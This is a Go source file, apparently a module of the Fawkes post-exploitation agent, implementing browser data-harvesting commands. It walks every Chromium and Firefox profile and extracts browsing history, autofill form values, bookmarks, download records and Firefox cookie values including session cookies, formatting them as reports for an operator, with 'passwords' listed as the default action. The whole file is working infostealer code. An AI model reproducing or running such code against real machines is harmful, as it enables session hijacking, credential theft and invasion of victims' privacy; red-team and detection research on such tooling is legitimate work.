package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// Shared browser command types and helpers used by both Windows and non-Windows.

type browserArgs struct {
	Action  string `json:"action"`  // passwords (default), cookies, history, autofill, bookmarks
	Browser string `json:"browser"` // all (default), chrome, edge, chromium
}

type browserBookmarkEntry struct {
	Browser string
	Name    string
	URL     string
	Folder  string
}

type bookmarkNode struct {
	Type     string         `json:"type"`
	Name     string         `json:"name"`
	URL      string         `json:"url"`
	Children []bookmarkNode `json:"children"`
}

func extractBookmarks(node *bookmarkNode, browser, folder string, out *[]browserBookmarkEntry) {
	if node.Type == "url" && node.URL != "" {
		*out = append(*out, browserBookmarkEntry{
			Browser: browser,
			Name:    node.Name,
			URL:     node.URL,
			Folder:  folder,
		})
	}
	for i := range node.Children {
		childFolder := folder
		if node.Children[i].Type == "folder" {
			childFolder = folder + "/" + node.Children[i].Name
		}
		extractBookmarks(&node.Children[i], browser, childFolder, out)
	}
}

// chromeTimeToString converts a Chrome/Chromium timestamp to a human-readable UTC string.
// Chrome uses two epoch formats:
// - History/cookies: microseconds since 1601-01-01 (very large numbers, >10^16)
// - Autofill: seconds since Unix epoch (smaller numbers, ~10^9)
// This function auto-detects based on magnitude.
func chromeTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	const chromeToUnixMicros = 11644473600000000
	if ts > 1e13 {
		unixMicros := ts - chromeToUnixMicros
		if unixMicros < 0 {
			return "unknown"
		}
		t := time.Unix(unixMicros/1000000, (unixMicros%1000000)*1000)
		return t.UTC().Format("2006-01-02 15:04:05")
	}
	t := time.Unix(ts, 0)
	return t.UTC().Format("2006-01-02 15:04:05")
}

// firefoxTimeToString converts a Firefox PRTime timestamp (microseconds since Unix epoch)
// to a human-readable UTC string.
func firefoxTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	t := time.Unix(ts/1000000, (ts%1000000)*1000)
	return t.UTC().Format("2006-01-02 15:04:05")
}

// isFirefoxBrowser returns true if the browser name indicates Firefox.
func isFirefoxBrowser(name string) bool {
	return strings.EqualFold(name, "Firefox")
}

// findFirefoxProfiles discovers Firefox profile directories within the given base path.
// Firefox profiles use random prefixes (e.g., "a1b2c3d4.default-release").
func findFirefoxProfiles(baseDir string) []string {
	var profiles []string

	entries, err := os.ReadDir(baseDir)
	if err != nil {
		return nil
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		// Firefox profile dirs contain ".default" or ".default-release" suffix
		if strings.Contains(name, ".default") {
			profiles = append(profiles, filepath.Join(baseDir, name))
		}
	}
	return profiles
}

// findProfilesWithFile returns Chromium profile directories containing the given file.
func findProfilesWithFile(userDataDir string, relPath string) []string {
	var profiles []string

	check := func(dir string) {
		if _, err := os.Stat(filepath.Join(dir, relPath)); err == nil {
			profiles = append(profiles, dir)
		}
	}

	check(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			check(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// browserHistory extracts browsing history from Chromium-based browsers.
// Calls platform-specific browserPaths() and openBrowserDB().
func browserHistory(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type historyEntry struct {
		Browser    string
		URL        string
		Title      string
		VisitCount int
		LastVisit  string
	}

	var allEntries []historyEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		var profiles []string
		var dbFile, query string
		var timeConvert func(int64) string

		if isFirefoxBrowser(browserName) {
			profiles = findFirefoxProfiles(userDataDir)
			dbFile = "places.sqlite"
			query = "SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 500"
			timeConvert = firefoxTimeToString
		} else {
			profiles = findProfilesWithFile(userDataDir, "History")
			dbFile = "History"
			query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
			timeConvert = chromeTimeToString
		}

		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, dbFile)
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query(query)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var url, title string
				var visitCount int
				var lastVisitTime int64

				if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
					continue
				}

				allEntries = append(allEntries, historyEntry{
					Browser:    label,
					URL:        url,
					Title:      title,
					VisitCount: visitCount,
					LastVisit:  timeConvert(lastVisitTime),
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser History (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		title := e.Title
		if title == "" {
			title = "(no title)"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s\n  %s  (visits: %d, last: %s)\n",
			e.Browser, truncStr(title, 80), truncStr(e.URL, 120), e.VisitCount, e.LastVisit))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserAutofill extracts autofill form data from Chromium-based browsers.
func browserAutofill(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type autofillEntry struct {
		Browser      string
		FieldName    string
		Value        string
		Count        int
		DateLastUsed string
	}

	var allEntries []autofillEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		var profiles []string
		var dbFile, query string
		var timeConvert func(int64) string

		if isFirefoxBrowser(browserName) {
			profiles = findFirefoxProfiles(userDataDir)
			dbFile = "formhistory.sqlite"
			query = "SELECT fieldname, value, timesUsed, lastUsed FROM moz_formhistory ORDER BY lastUsed DESC LIMIT 500"
			timeConvert = firefoxTimeToString
		} else {
			profiles = findProfilesWithFile(userDataDir, "Web Data")
			dbFile = "Web Data"
			query = "SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT 500"
			timeConvert = chromeTimeToString
		}

		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, dbFile)
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query(query)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var name, value string
				var count int
				var dateLastUsed int64

				if err := rows.Scan(&name, &value, &count, &dateLastUsed); err != nil {
					continue
				}

				allEntries = append(allEntries, autofillEntry{
					Browser:      label,
					FieldName:    name,
					Value:        value,
					Count:        count,
					DateLastUsed: timeConvert(dateLastUsed),
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Autofill (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("[%s] %s = %s  (used: %d times, last: %s)\n",
			e.Browser, e.FieldName, truncStr(e.Value, 60), e.Count, e.DateLastUsed))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserBookmarks extracts bookmarks from Chromium-based browsers.
func browserBookmarks(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	var allBookmarks []browserBookmarkEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		if isFirefoxBrowser(browserName) {
			// Firefox: bookmarks are in places.sqlite (moz_bookmarks + moz_places)
			profiles := findFirefoxProfiles(userDataDir)
			for _, profileDir := range profiles {
				dbPath := filepath.Join(profileDir, "places.sqlite")
				profileName := filepath.Base(profileDir)

				db, cleanup, err := openBrowserDB(dbPath)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
					continue
				}

				label := browserName
				if profileName != "Default" {
					label = fmt.Sprintf("%s (%s)", browserName, profileName)
				}

				// moz_bookmarks type=1 are URL bookmarks; join with moz_places for URLs
				// parent folder names come from moz_bookmarks where type=2 (folders)
				rows, err := db.Query(`
					SELECT b.title, p.url, COALESCE(f.title, '') AS folder
					FROM moz_bookmarks b
					JOIN moz_places p ON b.fk = p.id
					LEFT JOIN moz_bookmarks f ON b.parent = f.id AND f.type = 2
					WHERE b.type = 1 AND p.url NOT LIKE 'place:%'
					ORDER BY b.dateAdded DESC
					LIMIT 500`)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
					cleanup()
					continue
				}

				for rows.Next() {
					var title, url, folder string
					if err := rows.Scan(&title, &url, &folder); err != nil {
						continue
					}
					if title == "" {
						title = url
					}
					allBookmarks = append(allBookmarks, browserBookmarkEntry{
						Browser: label,
						Name:    title,
						URL:     url,
						Folder:  folder,
					})
				}
				if err := rows.Err(); err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
				}
				rows.Close()
				cleanup()
			}
			continue
		}

		// Chromium-based: bookmarks are in JSON Bookmarks file
		profiles := findProfilesWithFile(userDataDir, "Bookmarks")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			bmPath := filepath.Join(profileDir, "Bookmarks")
			profileName := filepath.Base(profileDir)

			data, err := os.ReadFile(bmPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			var bmFile struct {
				Roots map[string]json.RawMessage `json:"roots"`
			}
			if err := json.Unmarshal(data, &bmFile); err != nil {
				structs.ZeroBytes(data)
				errors = append(errors, fmt.Sprintf("%s (%s): parse: %v", browserName, profileName, err))
				continue
			}
			structs.ZeroBytes(data)

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rootName, raw := range bmFile.Roots {
				if len(raw) == 0 || raw[0] != '{' {
					continue
				}
				var node bookmarkNode
				if err := json.Unmarshal(raw, &node); err != nil {
					continue
				}
				extractBookmarks(&node, label, rootName, &allBookmarks)
			}
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Bookmarks (%d found) ===\n\n", len(allBookmarks)))

	for _, b := range allBookmarks {
		sb.WriteString(fmt.Sprintf("[%s] [%s] %s\n  %s\n",
			b.Browser, b.Folder, truncStr(b.Name, 80), truncStr(b.URL, 120)))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

// browserDownloads extracts download history from Chromium-based browsers and Firefox.
// Chromium: reads the downloads table from History SQLite database.
// Firefox: reads downloads.json from each profile directory.
// No decryption needed — works on all platforms.
func browserDownloads(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type downloadEntry struct {
		Browser   string
		URL       string
		FilePath  string
		Size      int64
		State     string
		MimeType  string
		StartTime string
	}

	var allEntries []downloadEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		if isFirefoxBrowser(browserName) {
			// Firefox: parse downloads.json from each profile
			profiles := findFirefoxProfiles(userDataDir)
			for _, profileDir := range profiles {
				dlPath := filepath.Join(profileDir, "downloads.json")
				profileName := filepath.Base(profileDir)

				data, err := os.ReadFile(dlPath)
				if err != nil {
					// downloads.json may not exist if no downloads have occurred
					continue
				}
				defer structs.ZeroBytes(data)

				var dlFile struct {
					List []struct {
						Source      string `json:"source"`
						Target      string `json:"target"`
						StartTime   int64  `json:"startTime"` // milliseconds since epoch
						TotalBytes  int64  `json:"totalBytes"`
						State       int    `json:"state"` // 0=downloading, 1=succeeded, 2=failed, 3=canceled, 4=paused, 5=blocked
						ContentType string `json:"contentType"`
					} `json:"list"`
				}
				if err := json.Unmarshal(data, &dlFile); err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): parse downloads.json: %v", browserName, profileName, err))
					continue
				}

				label := browserName
				if profileName != "Default" {
					label = fmt.Sprintf("%s (%s)", browserName, profileName)
				}

				for _, dl := range dlFile.List {
					// Convert file:// URI to path
					filePath := dl.Target
					if strings.HasPrefix(filePath, "file:///") {
						filePath = filePath[len("file://"):]
					} else if strings.HasPrefix(filePath, "file://") {
						filePath = filePath[len("file://"):]
					}

					state := firefoxDownloadState(dl.State)
					startTime := "unknown"
					if dl.StartTime > 0 {
						// StartTime is milliseconds since epoch
						t := time.Unix(dl.StartTime/1000, (dl.StartTime%1000)*1000000)
						startTime = t.UTC().Format("2006-01-02 15:04:05")
					}

					allEntries = append(allEntries, downloadEntry{
						Browser:   label,
						URL:       dl.Source,
						FilePath:  filePath,
						Size:      dl.TotalBytes,
						State:     state,
						MimeType:  dl.ContentType,
						StartTime: startTime,
					})
				}
			}
			continue
		}

		// Chromium-based: downloads table in History database
		profiles := findProfilesWithFile(userDataDir, "History")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "History")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT target_path, tab_url, total_bytes, start_time, state, mime_type FROM downloads ORDER BY start_time DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var targetPath, tabURL, mimeType string
				var totalBytes, startTime int64
				var state int

				if err := rows.Scan(&targetPath, &tabURL, &totalBytes, &startTime, &state, &mimeType); err != nil {
					continue
				}

				allEntries = append(allEntries, downloadEntry{
					Browser:   label,
					URL:       tabURL,
					FilePath:  targetPath,
					Size:      totalBytes,
					State:     chromeDownloadState(state),
					MimeType:  mimeType,
					StartTime: chromeTimeToString(startTime),
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Downloads (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sizeStr := "unknown"
		if e.Size >= 0 {
			sizeStr = formatBytes(uint64(e.Size))
		}
		sb.WriteString(fmt.Sprintf("[%s] %s (%s, %s)\n  URL: %s\n  File: %s\n",
			e.Browser, e.State, sizeStr, e.StartTime,
			truncStr(e.URL, 120), truncStr(e.FilePath, 120)))
		if e.MimeType != "" {
			sb.WriteString(fmt.Sprintf("  Type: %s\n", e.MimeType))
		}
		sb.WriteString("\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allEntries) == 0 && len(errors) == 0 {
		sb.WriteString("No download history found.\n")
	}

	return successResult(sb.String())
}

// chromeDownloadState converts a Chrome download state int to a human-readable string.
func chromeDownloadState(state int) string {
	switch state {
	case 0:
		return "In Progress"
	case 1:
		return "Complete"
	case 2:
		return "Cancelled"
	case 3:
		return "Interrupted"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}

// firefoxDownloadState converts a Firefox download state int to a human-readable string.
func firefoxDownloadState(state int) string {
	switch state {
	case 0:
		return "Downloading"
	case 1:
		return "Complete"
	case 2:
		return "Failed"
	case 3:
		return "Cancelled"
	case 4:
		return "Paused"
	case 5:
		return "Blocked"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}

// browserFirefoxCookies extracts cookies from Firefox's cookies.sqlite (plaintext, no encryption).
// This works on all platforms since Firefox doesn't encrypt cookie values.
func browserFirefoxCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type cookieEntry struct {
		Browser    string
		Host       string
		Name       string
		Value      string
		Path       string
		Expiry     string
		IsSecure   bool
		IsHTTPOnly bool
	}

	var allEntries []cookieEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if !isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findFirefoxProfiles(userDataDir)
		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "cookies.sqlite")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies ORDER BY lastAccessed DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var host, name, value, path string
				var expiry int64
				var isSecure, isHTTPOnly int

				if err := rows.Scan(&host, &name, &value, &path, &expiry, &isSecure, &isHTTPOnly); err != nil {
					continue
				}

				allEntries = append(allEntries, cookieEntry{
					Browser:    label,
					Host:       host,
					Name:       name,
					Value:      truncStr(value, 100),
					Path:       path,
					Expiry:     firefoxTimeToString(expiry * 1000000), // expiry is in seconds
					IsSecure:   isSecure != 0,
					IsHTTPOnly: isHTTPOnly != 0,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Firefox Cookies (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		flags := ""
		if e.IsSecure {
			flags += " [Secure]"
		}
		if e.IsHTTPOnly {
			flags += " [HttpOnly]"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s: %s = %s  (path: %s, expires: %s)%s\n",
			e.Browser, e.Host, e.Name, e.Value, e.Path, e.Expiry, flags))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No Firefox cookies found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}
